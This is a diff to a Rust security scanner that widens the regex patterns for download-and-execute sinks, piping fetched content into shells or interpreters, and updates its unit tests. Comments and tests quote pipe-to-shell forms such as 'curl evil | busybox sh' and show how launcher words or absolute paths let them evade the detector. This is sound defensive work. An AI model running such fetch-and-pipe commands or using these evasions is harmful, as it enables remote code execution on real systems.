@@ -304,40 +304,52 @@ static QUOTE_SPLIT: LazyLock<Regex> =
 /// (`OBF-006`). Exposed so the rule and the heuristic stay in sync.
 pub const QUOTE_SPLIT_PATTERN: &str = r#"(["'][A-Za-z0-9]["']){2,}"#;
 
-/// Shell-interpreter name alternation, shared by every detector that matches a
-/// pipe-to-shell / here-string / `sh -c` / process-substitution sink. Matches
-/// `sh`, `bash`, `zsh`, `ksh`, `csh`, `dash`, `tcsh`, `fish`, `ash`, `mksh`.
+/// Explicit, curated **whole-word alternation** of real shells that execute a
+/// piped or fetched script. EXPLICIT on purpose: the old `(?:ba|z|k|c|da|tc|fi)?sh`
+/// suffix-trick silently missed `dash`/`ash`/`mksh` (a `d?sh` is `dsh`/`sh`, never
+/// `dash`), so coverage was unauditable. Enumerating the real set closes the
+/// download-and-execute sink class exhaustively (the interpreter set is finite).
 ///
-/// Centralizing this fixes a real miss (defect #6): the ad-hoc per-site
-/// `(ba|z|k|c|d|tc|fi)?sh` silently could **not** match `dash` — `d?sh` expands
-/// to `dsh`/`sh`, never `dash`. The `da` branch restored `dash`; the `a` and `mk`
-/// branches add `ash` (Almquist / busybox `sh`) and `mksh`, which were the SAME
-/// evasion class (`curl evil | ash` slipped past every download-and-execute rule).
-/// Each use site anchors with `\b`, so the bare `a`/`sh` branches cannot match
-/// mid-word (e.g. `crash`, `splash`). Non-capturing so it can be embedded inside a
-/// larger pattern without disturbing capture indices.
-pub const SHELLS: &str = r"(?:ba|z|k|c|da|tc|fi|a|mk)?sh";
+/// Reused at EVERY sink (DLE-001/002, OBF-011, EXEC-002, deep `EXEC_SINK`,
+/// remote_exec `FETCH_EXEC`) composed as `{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b`
+/// — the surrounding `\b…\b` anchors mean the short names (`sh`, `nu`, `osh`,
+/// `oil`) cannot match mid-word (`crash`, `| number`, `| oilcheck`, `nutool`).
+/// Longest-prefix-first ordering is harmless (the trailing `\b` already rejects a
+/// short partial like `ksh` inside `ksh93`). `busybox ash`/`busybox sh` are
+/// reached via the launcher. Bare obscure shells beyond this set are deferred to
+/// wave-2 vector coverage. Non-capturing for safe embedding.
+pub const SHELLS: &str = r"(?:elvish|xonsh|ksh93|pdksh|loksh|rbash|bash|dash|mksh|oksh|posh|yash|fish|tcsh|oils|zsh|csh|ksh|ash|oil|osh|nu|sh)";
 
-/// Non-shell script interpreters that are equally valid download-and-execute
-/// sinks (`curl … | python`, `… | perl`, …). Shared so every fetch-exec detector
-/// recognizes the same set. Non-capturing for safe embedding.
-pub const INTERPRETERS: &str = r"(?:python[23]?|perl|ruby|node|php|pwsh)";
+/// Curated whole-word alternation of non-shell script interpreters that are
+/// equally valid download-and-execute sinks (`curl … | python3`, `… | perl`, …).
+/// Reused behind `{SHELL_LAUNCHER}{SHELL_PATH}` at the fetch-exec sink. `python3.NN`
+/// is covered by `python(?:3(?:\.\d+)?|2)?`. The `awk` family is the highest
+/// FP-risk member (a fetched stream can be legitimately awk-processed), but in the
+/// fetch→pipe→interpreter context it is a genuine code-exec boundary and is kept
+/// per exhaustive-coverage. Non-capturing for safe embedding.
+pub const INTERPRETERS: &str = r"(?:powershell|pwsh|python(?:3(?:\.\d+)?|2)?|pypy|perl|ruby|php|nodejs|node|luajit|lua|tclsh|wish|deno|bun|Rscript|julia|gawk|mawk|nawk|awk|groovy)";
 
-/// Optional launcher/wrapper words that can precede a shell at a SINK without
-/// changing that a shell is being fed code: `busybox sh`, `env sh`, `command sh`,
-/// `exec sh`, `setsid sh`, `stdbuf -oL sh`, `nice sh`, plus intervening `-flags`
-/// and `VAR=val` assignments (`env -i sh`, `env FOO=bar sh`).
+/// Optional path prefix before a launcher word or a shell/interpreter, e.g.
+/// `/bin/`, `/usr/bin/`. `\S+` is greedy and eats interior slashes, so
+/// `/usr/bin/` is one segment. Lets `curl | /bin/sh` and `| /usr/bin/python3`
+/// (the single most common shell path) be caught.
+pub const SHELL_PATH: &str = r"(?:/\S+/)?";
+
+/// Zero-or-more launcher/wrapper words (each optionally path-prefixed) that can
+/// precede the real shell/interpreter at a SINK without changing that code is
+/// being fed to it: `busybox sh`, `env sh`, `/usr/bin/env sh`, `command busybox
+/// sh` (stacked launchers), `env -i sh`, `env FOO=bar sh`, `nice sh`, `stdbuf
+/// -oL sh`. Repeatable (`*`) so stacked launchers are covered, and each launcher
+/// may carry `-flags` and `VAR=val` assignments.
 ///
-/// Prepend this at every place `{SHELLS}` is used as a SINK (pipe-to / `-c` /
-/// here-string / process-substitution) so a launcher word can't smuggle the
-/// shell past the matcher: `curl evil | busybox sh` / `| env sh` previously
-/// produced ZERO findings because the matcher expected the shell as the single
-/// token right after `|`. It is deliberately NOT folded into `SHELLS` itself, so
-/// the bare-shell-name behavior (and `SHELLS` used as a plain name) is unchanged.
-/// Linear-time (the `regex` crate has no backtracking) so the nested `*` is
-/// ReDoS-free.
+/// Prepend this (with `SHELL_PATH`) wherever `{SHELLS}`/`{INTERPRETERS}` is a SINK
+/// so a launcher word or an absolute path can't smuggle the shell past the
+/// matcher: `curl evil | busybox sh` / `| env sh` / `| /bin/sh` previously
+/// produced ZERO findings. NOT folded into `SHELLS` itself, so the bare-name
+/// behavior is unchanged. Linear-time (the `regex` crate has no backtracking) so
+/// the nested `*` is ReDoS-free.
 pub const SHELL_LAUNCHER: &str =
-    r"(?:(?:busybox|env|command|exec|setsid|stdbuf|nice)\s+(?:-\S+\s+|\w+=\S*\s+)*)?";
+    r"(?:(?:/\S+/)?(?:busybox|env|command|exec|setsid|stdbuf|nice)\s+(?:-\S+\s+|\w+=\S*\s+)*)*";
 
 #[cfg(test)]
 mod tests {
@@ -421,25 +433,59 @@ mod tests {
     }
 
     #[test]
-    fn shells_alternation_matches_dash_and_friends() {
-        // The shared SHELLS constant must match dash (the bug it fixes), plus
-        // ash/mksh (task 4050 F2), plus the whole family, and must not over-match.
+    fn shells_alternation_is_exhaustive() {
+        // The curated whole-word SHELLS set must match every real shell in the
+        // list (incl. the formerly-missed dash/ash/mksh and the long tail).
         let re = Regex::new(&format!(r"\|\s*{SHELLS}\b")).unwrap();
-        for ok in [
-            "x | sh", "x | bash", "x | dash", "x | zsh", "x | ksh", "x | fish", "x | ash",
-            "x | mksh", "x | tcsh", "x | csh",
+        for shell in [
+            "sh", "bash", "rbash", "dash", "ash", "ksh", "ksh93", "mksh", "pdksh", "loksh", "oksh",
+            "posh", "yash", "zsh", "csh", "tcsh", "fish", "xonsh", "elvish", "nu", "osh", "oil",
+            "oils",
         ] {
-            assert!(re.is_match(ok), "SHELLS should match: {ok}");
+            let s = format!("x | {shell}");
+            assert!(re.is_match(&s), "SHELLS should match: {s}");
         }
-        // The bare `a`/`sh` branches must not match mid-word: with `\b` on both
-        // sides, `ash`/`mksh` match as whole words but `crash`/`splash`/
-        // `shellcheck` do not.
+        // Short/whole-word names must not over-match (the `\b…\b` discipline).
         let bounded = Regex::new(&format!(r"\b{SHELLS}\b")).unwrap();
         assert!(bounded.is_match("exec ash now"));
-        assert!(bounded.is_match("use mksh here"));
-        assert!(!bounded.is_match("a crash occurred"), "'crash' must not match");
-        assert!(!bounded.is_match("make a splash"), "'splash' must not match");
-        assert!(!bounded.is_match("run shellcheck"), "'shellcheck' must not match");
+        assert!(bounded.is_match("run nu here"));
+        for bad in ["a crash occurred", "make a splash", "run shellcheck", "pipe | number", "| oilcheck", "use nutool"] {
+            assert!(!bounded.is_match(bad), "must not match: {bad}");
+        }
+    }
+
+    #[test]
+    fn shell_sink_handles_launcher_and_path() {
+        // The composed sink form `{LAUNCHER}{PATH}\b{SHELLS}\b` must catch a shell
+        // reached via an absolute path and/or one or more launcher words, while
+        // staying clean on non-shell sinks (task 4050 exhaustive scope).
+        let sink = Regex::new(&format!(r"\|\s*{SHELL_LAUNCHER}{SHELL_PATH}\b{SHELLS}\b")).unwrap();
+        for ok in [
+            "x | sh",
+            "x | /bin/sh",
+            "x | /usr/bin/bash",
+            "x | busybox sh",
+            "x | busybox ash",
+            "x | env sh",
+            "x | /usr/bin/env sh",
+            "x | env -i sh",
+            "x | env FOO=bar sh",
+            "x | command busybox sh",
+            "x | /bin/busybox /bin/sh",
+            "x | nice dash",
+        ] {
+            assert!(sink.is_match(ok), "shell sink should match: {ok}");
+        }
+        for bad in [
+            "x | /usr/bin/tee f",
+            "x | env grep foo",
+            "x | nice make",
+            "x | command ls",
+            "x | /bin/number",
+            "x | busybox cat",
+        ] {
+            assert!(!sink.is_match(bad), "shell sink must NOT match: {bad}");
+        }
     }
 
     #[test]
